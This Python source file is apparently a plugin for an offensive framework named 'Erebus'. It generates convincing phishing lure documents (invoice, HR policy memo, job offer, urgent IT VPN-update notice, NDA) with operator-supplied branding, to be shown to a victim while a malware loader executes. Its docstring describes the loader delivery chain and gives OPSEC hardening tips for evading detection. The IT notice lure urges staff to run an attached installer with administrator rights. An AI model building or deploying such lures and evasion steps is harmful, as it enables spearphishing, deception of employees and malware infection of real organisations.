"""
Erebus Plugin - Decoy Document Generator

Generates convincing lure documents (DOCX / XLSX / PDF stub) shown to
the victim while the loader executes in the background.

Delivery chain: loader spawns decoy in a background thread on DLL_PROCESS_ATTACH,
decoy opens in the foreground (Word / Excel / Acrobat) so the victim sees plausible
content. Loader continues independently. Decoy is written to %TEMP% and deleted
after display.

Supported lure templates:
  invoice       - accounts payable invoice with line items
  hr_policy     - internal HR policy update memo
  job_offer     - employment offer letter
  it_notice     - IT security / VPN update notice
  nda           - non-disclosure agreement

Operator supplies:
  - company_name:  Fills header / letterhead fields (default: "Acme Corporation")
  - recipient:     Addressee name (default: "Valued Employee")
  - logo_path:     Optional PNG/JPG to embed as letterhead logo

OPSEC Notes:
  Detection Surface:
    - loader spawning winword.exe / excel.exe / AcroRd32.exe as a child
    - TEMP dir file creation followed by ShellExecuteA then deletion
    - Word/Excel opening a document immediately on process start (unusual timing)
  Behavioral Indicators:
    - Child process from an unsigned binary opening Office docs
    - File written to TEMP with a random name then immediately opened
  Hardening:
    - [MALLEABLE] Delay decoy open by a few seconds (sleep in loader thread)
    - [MALLEABLE] Use a real corporate filename, not a random one
    - [MALLEABLE] Pre-stage the decoy in the container alongside the loader;
      open from the container path rather than writing to TEMP

Reference: T1566.001 - Spearphishing Attachment (lure document component)
"""

import io
import pathlib
import random
import string
from datetime import date
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory

try:
    from docx import Document
    from docx.shared import Pt, RGBColor, Inches
    from docx.enum.text import WD_ALIGN_PARAGRAPH
    _DOCX_AVAILABLE = True
except ImportError:
    _DOCX_AVAILABLE = False

try:
    import openpyxl
    from openpyxl.styles import Font, Alignment, PatternFill, Border, Side
    _XLSX_AVAILABLE = True
except ImportError:
    _XLSX_AVAILABLE = False


def _rand_ref(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=n))


def _today() -> str:
    return date.today().strftime("%B %d, %Y")


# ---------------------------------------------------------------------------
# DOCX lure builders
# ---------------------------------------------------------------------------

def _build_invoice_docx(company_name: str, recipient: str, logo_path: Optional[str]) -> "Document":
    doc = Document()

    # Narrow margins
    for section in doc.sections:
        section.top_margin = Inches(0.75)
        section.bottom_margin = Inches(0.75)
        section.left_margin = Inches(1.0)
        section.right_margin = Inches(1.0)

    if logo_path and _img_exists(logo_path):
        doc.add_picture(logo_path, width=Inches(1.5))

    h = doc.add_heading(company_name, level=1)
    h.alignment = WD_ALIGN_PARAGRAPH.CENTER
    h.runs[0].font.color.rgb = RGBColor(0x1F, 0x49, 0x7D)

    ref = _rand_ref()
    doc.add_paragraph(f"INVOICE #{ref}", style="Heading 2")
    doc.add_paragraph(f"Date: {_today()}")
    doc.add_paragraph(f"Bill To: {recipient}")
    doc.add_paragraph("")

    table = doc.add_table(rows=1, cols=4)
    table.style = "Light Shading Accent 1"
    hdr = table.rows[0].cells
    for i, h in enumerate(["Description", "Qty", "Unit Price", "Total"]):
        hdr[i].text = h

    items = [
        ("Professional Services - Q2 Retainer", "1", "$4,800.00", "$4,800.00"),
        ("Software License Renewal", "3", "$450.00", "$1,350.00"),
        ("Travel & Expenses", "1", "$312.50", "$312.50"),
    ]
    for item in items:
        row = table.add_row().cells
        for i, val in enumerate(item):
            row[i].text = val

    doc.add_paragraph("")
    doc.add_paragraph(f"Total Due: $6,462.50").runs[0].bold = True
    doc.add_paragraph(f"Payment Terms: Net 30. Please remit to {company_name} Accounts Payable.")
    doc.add_paragraph(f"\nThank you for your business.\n\n{company_name} Finance Department")
    return doc


def _build_hr_policy_docx(company_name: str, recipient: str, logo_path: Optional[str]) -> "Document":
    doc = Document()
    for section in doc.sections:
        section.top_margin = Inches(1.0)
        section.left_margin = Inches(1.25)
        section.right_margin = Inches(1.25)

    if logo_path and _img_exists(logo_path):
        doc.add_picture(logo_path, width=Inches(1.5))

    h = doc.add_heading(f"{company_name}\nHuman Resources", level=1)
    h.runs[0].font.color.rgb = RGBColor(0x1F, 0x49, 0x7D)

    doc.add_heading("INTERNAL POLICY UPDATE - MANDATORY REVIEW", level=2)
    doc.add_paragraph(f"Date: {_today()}")
    doc.add_paragraph(f"To: {recipient}")
    doc.add_paragraph("From: Human Resources Department")
    doc.add_paragraph("Re: Updated Remote Work & Information Security Policy (Revision 4.2)")
    doc.add_paragraph("")
    doc.add_paragraph(
        "Effective immediately, all employees are required to review and acknowledge the "
        "updated Remote Work and Information Security Policy. Key changes include:\n"
        "  1. VPN usage is now mandatory for all remote connections to corporate systems.\n"
        "  2. Multi-factor authentication (MFA) will be enforced on all accounts by end of quarter.\n"
        "  3. Personal device usage for corporate data is subject to the updated BYOD agreement.\n"
        "  4. Data classification labels must be applied to all internal documents.\n"
    )
    doc.add_paragraph(
        "Please sign and return the acknowledgement form attached to this memo within five (5) "
        "business days. Failure to comply may result in suspension of remote access privileges."
    )
    doc.add_paragraph(f"\n{company_name} Human Resources\n{_today()}")
    return doc


def _build_job_offer_docx(company_name: str, recipient: str, logo_path: Optional[str]) -> "Document":
    doc = Document()
    for section in doc.sections:
        section.top_margin = Inches(1.0)
        section.left_margin = Inches(1.25)
        section.right_margin = Inches(1.25)

    if logo_path and _img_exists(logo_path):
        doc.add_picture(logo_path, width=Inches(1.5))

    h = doc.add_heading(f"Offer of Employment - {company_name}", level=1)
    h.runs[0].font.color.rgb = RGBColor(0x1F, 0x49, 0x7D)

    doc.add_paragraph(f"{_today()}\n")
    doc.add_paragraph(f"Dear {recipient},")
    doc.add_paragraph(
        f"We are pleased to offer you the position of Senior Systems Engineer at {company_name}. "
        "This letter confirms the terms of your employment as discussed."
    )
    doc.add_paragraph("")
    doc.add_heading("Compensation & Benefits", level=3)
    doc.add_paragraph(
        "Base Salary: $135,000 per annum\n"
        "Sign-On Bonus: $10,000 (paid within 30 days of start date)\n"
        "Equity: 0.15% options vesting over 4 years (1-year cliff)\n"
        "Health / Dental / Vision: Fully covered for employee and dependents\n"
        "PTO: 20 days per year, plus 10 company holidays\n"
        "Remote: Hybrid (3 days in-office, 2 days remote)"
    )
    doc.add_paragraph("")
    doc.add_paragraph(
        "Please review the attached terms and sign the enclosed agreement by "
        f"{date.today().strftime('%B %d')}, {date.today().year + 0}. "
        "We look forward to welcoming you to the team."
    )
    doc.add_paragraph(f"\nSincerely,\n\nTalent Acquisition\n{company_name}")
    return doc


def _build_it_notice_docx(company_name: str, recipient: str, logo_path: Optional[str]) -> "Document":
    doc = Document()
    for section in doc.sections:
        section.top_margin = Inches(0.75)
        section.left_margin = Inches(1.0)
        section.right_margin = Inches(1.0)

    if logo_path and _img_exists(logo_path):
        doc.add_picture(logo_path, width=Inches(1.5))

    h = doc.add_heading(f"{company_name} - IT Security Notice", level=1)
    h.runs[0].font.color.rgb = RGBColor(0xC0, 0x00, 0x00)

    doc.add_paragraph(f"Date: {_today()}")
    doc.add_paragraph(f"To: {recipient}")
    doc.add_paragraph("From: IT Security Operations")
    doc.add_paragraph("")
    doc.add_heading("URGENT: Required VPN Client Update", level=2)
    doc.add_paragraph(
        "A critical security vulnerability has been identified in the current VPN client "
        "(CVE-2024-XXXX). All remote employees must update to the latest version by "
        f"{date.today().strftime('%B %d')}, {date.today().year} or remote access will be suspended.\n"
        "\nTo update:\n"
        "  1. Close all open applications.\n"
        "  2. Run the attached installer with administrator privileges.\n"
        "  3. Restart your workstation.\n"
        "  4. Confirm your VPN connection is active before the deadline.\n"
    )
    doc.add_paragraph(
        "If you encounter any issues, contact the IT help desk at helpdesk@" +
        company_name.lower().replace(" ", "") + ".com or call ext. 4357."
    )
    doc.add_paragraph(f"\nIT Security Operations\n{company_name}")
    return doc


def _build_nda_docx(company_name: str, recipient: str, logo_path: Optional[str]) -> "Document":
    doc = Document()
    for section in doc.sections:
        section.top_margin = Inches(1.0)
        section.left_margin = Inches(1.25)
        section.right_margin = Inches(1.25)

    if logo_path and _img_exists(logo_path):
        doc.add_picture(logo_path, width=Inches(1.5))

    h = doc.add_heading("MUTUAL NON-DISCLOSURE AGREEMENT", level=1)
    h.alignment = WD_ALIGN_PARAGRAPH.CENTER

    doc.add_paragraph(
        f"This Mutual Non-Disclosure Agreement (\"Agreement\") is entered into as of {_today()} "
        f"between {company_name} (\"Company\") and {recipient} (\"Recipient\")."
    )
    doc.add_heading("1. Definition of Confidential Information", level=3)
    doc.add_paragraph(
        "\"Confidential Information\" means any information disclosed by either party that is "
        "marked as confidential or would reasonably be understood to be confidential given the "
        "nature of the information and circumstances of disclosure."
    )
    doc.add_heading("2. Obligations", level=3)
    doc.add_paragraph(
        "Each party agrees to: (a) hold the other's Confidential Information in strict confidence; "
        "(b) not disclose such information to third parties without prior written consent; "
        "(c) use the information solely for the purpose of evaluating a potential business relationship."
    )
    doc.add_heading("3. Term", level=3)
    doc.add_paragraph(
        "This Agreement shall remain in effect for three (3) years from the date first written above."
    )
    doc.add_paragraph("\n\nIN WITNESS WHEREOF, the parties have executed this Agreement as of the date above.")
    doc.add_paragraph(f"\n{company_name}\n\nSignature: _______________________\nName: ___________________________\nTitle: ___________________________")
    doc.add_paragraph(f"\nRecipient: {recipient}\n\nSignature: _______________________\nDate: ___________________________")
    return doc


# ---------------------------------------------------------------------------
# XLSX invoice builder
# ---------------------------------------------------------------------------

def _build_invoice_xlsx(company_name: str, recipient: str) -> "openpyxl.Workbook":
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Invoice"

    # Header
    ws.merge_cells("A1:E1")
    ws["A1"] = company_name
    ws["A1"].font = Font(bold=True, size=16, color="1F497D")
    ws["A1"].alignment = Alignment(horizontal="center")

    ws["A2"] = f"INVOICE #{_rand_ref()}"
    ws["A2"].font = Font(bold=True, size=12)
    ws["B2"] = f"Date: {_today()}"
    ws["A3"] = f"Bill To: {recipient}"

    # Column headers
    header_fill = PatternFill("solid", fgColor="1F497D")
    header_font = Font(bold=True, color="FFFFFF")
    for col, label in enumerate(["Description", "Qty", "Unit Price", "Total", "Notes"], start=1):
        cell = ws.cell(row=5, column=col, value=label)
        cell.fill = header_fill
        cell.font = header_font
        cell.alignment = Alignment(horizontal="center")

    items = [
        ("Professional Services - Q2 Retainer", 1, 4800.00, 4800.00, ""),
        ("Software License Renewal", 3, 450.00, 1350.00, "Annual"),
        ("Travel & Expenses", 1, 312.50, 312.50, "Reimbursable"),
    ]
    for i, item in enumerate(items, start=6):
        ws.cell(row=i, column=1, value=item[0])
        ws.cell(row=i, column=2, value=item[1])
        ws.cell(row=i, column=3, value=item[2])
        ws.cell(row=i, column=4, value=item[3])
        ws.cell(row=i, column=5, value=item[4])

    total_row = 6 + len(items)
    ws.cell(row=total_row, column=3, value="TOTAL DUE").font = Font(bold=True)
    ws.cell(row=total_row, column=4, value=6462.50).font = Font(bold=True)

    ws.column_dimensions["A"].width = 42
    ws.column_dimensions["B"].width = 8
    ws.column_dimensions["C"].width = 14
    ws.column_dimensions["D"].width = 14
    ws.column_dimensions["E"].width = 16
    return wb


def _img_exists(path: Optional[str]) -> bool:
    return bool(path and pathlib.Path(path).is_file())


_DOCX_BUILDERS: Dict[str, Callable] = {
    "invoice":   _build_invoice_docx,
    "hr_policy": _build_hr_policy_docx,
    "job_offer": _build_job_offer_docx,
    "it_notice": _build_it_notice_docx,
    "nda":       _build_nda_docx,
}


class DecoyDocPlugin(ErebusPlugin):
    """Generate convincing lure DOCX / XLSX decoy documents with operator-supplied branding."""

    metadata = PluginMetadata(
        name="Decoy Document Generator",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        description="Generate branded lure DOCX/XLSX decoy documents for display while loader runs",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self) -> Dict[str, Callable]:
        return {
            "create_decoy_document": self.create_decoy_document,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        if not _DOCX_AVAILABLE and not _XLSX_AVAILABLE:
            return False, "Neither python-docx nor openpyxl is available"
        return True, None

    def on_load(self):
        pass

    # ------------------------------------------------------------------ #

    def create_decoy_document(
        self,
        output_dir: str,
        template: str = "invoice",
        company_name: str = "Acme Corporation",
        recipient: str = "Valued Employee",
        logo_path: Optional[str] = None,
        output_format: str = "docx",
        output_filename: Optional[str] = None,
    ) -> pathlib.Path:
        """Generate a lure document for use as a decoy while the loader executes.

        The resulting file should be placed in the payload directory alongside the
        loader. The loader opens it via ShellExecuteA on attach so the victim sees
        plausible content. The file is named to match the delivery pretext.

        Args:
            output_dir:      Directory to write the decoy file into.
            template:        Lure template to use. One of:
                             "invoice", "hr_policy", "job_offer", "it_notice", "nda"
            company_name:    Company name used in letterhead / header fields.
            recipient:       Addressee name (Dear {recipient}, Bill To, etc.)
            logo_path:       Optional path to PNG/JPG logo embedded as letterhead image.
                             If None or file not found, no image is embedded.
            output_format:   "docx" (default) or "xlsx" (invoice template only).
            output_filename: Override the output filename. If None, a plausible
                             name is derived from the template type.

        Returns:
            pathlib.Path: Path to the generated decoy file.

        Raises:
            ValueError: If the requested format/template combination is unsupported.
            ImportError: If the required library (python-docx / openpyxl) is missing.
        """
        out = pathlib.Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)

        template = template.lower()
        output_format = output_format.lower()

        _default_names = {
            "invoice":   "Invoice_Q2_2025.docx",
            "hr_policy": "HR_Policy_Update_v4.2.docx",
            "job_offer": "Offer_Letter.docx",
            "it_notice": "IT_Security_Notice.docx",
            "nda":       "NDA_Agreement.docx",
        }

        if output_format == "xlsx":
            if template != "invoice":
                raise ValueError("xlsx format only supported for 'invoice' template")
            if not _XLSX_AVAILABLE:
                raise ImportError("openpyxl is required for xlsx output")
            fname = output_filename or "Invoice_Q2_2025.xlsx"
            path = out / fname
            wb = _build_invoice_xlsx(company_name, recipient)
            wb.save(str(path))
            return path

        if not _DOCX_AVAILABLE:
            raise ImportError("python-docx is required for docx output")

        builder = _DOCX_BUILDERS.get(template)
        if builder is None:
            raise ValueError(
                f"Unknown template '{template}'. "
                f"Valid options: {', '.join(_DOCX_BUILDERS.keys())}"
            )

        fname = output_filename or _default_names.get(template, "document.docx")
        path = out / fname

        doc = builder(company_name, recipient, logo_path)
        doc.save(str(path))
        return path


_plugin = DecoyDocPlugin()

if __name__ == "__main__":
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
